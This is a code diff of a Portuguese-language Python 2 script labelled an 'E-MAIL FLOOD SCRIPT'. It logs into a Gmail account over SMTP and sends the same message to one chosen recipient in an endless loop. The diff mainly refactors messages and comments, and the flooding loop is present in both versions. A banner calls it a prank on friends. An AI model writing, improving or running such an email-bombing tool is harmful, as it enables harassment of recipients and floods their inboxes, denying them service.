@@ -6,22 +6,17 @@ from email.MIMEMultipart import MIMEMultipart
 import smtplib as s
 import sys
 
-
-#FUNÇÃO MAIN DO SISTEMA
 def main():
-    print banner()
+    banner()
     email_user = raw_input('INFORME SEU E-MAIL (GMAIL): ')
     email_pass = raw_input('INFORME SUA SENHA: ')
 
     validade,conn = test(email_user, email_pass)
-    print '[!] CONEXÃO REALIZADA COM SUCESSO!'
     print conn
     if validade == True:
         send_emails(email_user,conn)
     else:
-        print conn_error()
         sys.exit
-
 
 #VALIDA O LOGIN E SENHA
 def test(email_user, email_pass):
@@ -33,50 +28,41 @@ def test(email_user, email_pass):
         return True,conn
 
     except:
-        print conn_error()
-
-
-#RETORNA UM GUIA DE RESOLUÇÃO DE PROBLEMAS
-def conn_error():
-        print '[x] FALHA NA CONEXÃO'
+        print 'FALHA NA CONEXÃO'
         print '1º - VERIFIQUE SEU USUÁRIO E SENHA'
         print '2º - CERTIFIQUE-SE DE QUE HABILITOU OS APLICATIVOS MENOS SEGUROS'
         print 'URL: https://www.google.com/settings/security/lesssecureapps'
         return False
 
-
-
-#ESSA FUNÇÃO É RESPONSÁVEL PELO ENVIO DOS EMAILS
 def send_emails(email_user,conn):
     #Pega o e-mail da vítima
     FROM = email_user
-    TO = raw_input('[!] INFORME O DESTINATÁRIO: ')
+    TO = raw_input('INFORME O DESTINATÁRIO: ')
 
     #Escreve o e-mail
-    SUBJECT = raw_input('[!] INFORME O ASSUNTO: ')
-    text = raw_input('[!] ESCREVA UMA MENSAGEM: ')
+    SUBJECT = raw_input('INFORME O ASSUNTO: ')
+    text = raw_input('ESCREVA UMA MENSAGEM: ')
 
     #Formata a mensagem nos padrões de envio SMTP
     message = MIMEMultipart()
     message['From'] = FROM
     message['To'] = TO
     message['Subject'] = SUBJECT
-    message.attach(MIMEText(text, 'plain', 'utf-8'))
+    message.attach(MIMEText(text, 'plain'))
     email = message.as_string()
 
-    #Envia o E-mail em looping
-    while True:
+    #Envia o E-mail
+    while 1:
         try:
             conn.sendmail(FROM, TO, email)
-            print '[*] Floodando seu amigo... Pressione CTRL + C para cancelar'
+            print 'Floodando seu amigo.. Pressione CTRL + C para cancelar'
         except:
-            print '[x] Fail...'
+            print 'Fail...'
             sys.exit()
 
 
-#SÓ RETORNA UM BANNER COM ALGUNS AVISOS E EXPLICAÇÕES SOBRE A FERRAMENTA
 def banner():
-    banner = """
+    print """
  ---|E-MAIL FLOOD SCRIPT|-----------------------------------------------------------------------------------
 |                                                                                                           |
 |   ESTE SCRIPT FOI PROJETO POR DIVERSÃO. ELE É PERFEITO PARA PEGADINHAS COM SEUS AMIGOS,                   |
@@ -92,6 +78,6 @@ def banner():
  -----------------------------------------------------------------------------------------------------------
 
  """
-    return banner
+    return True
 
 main()
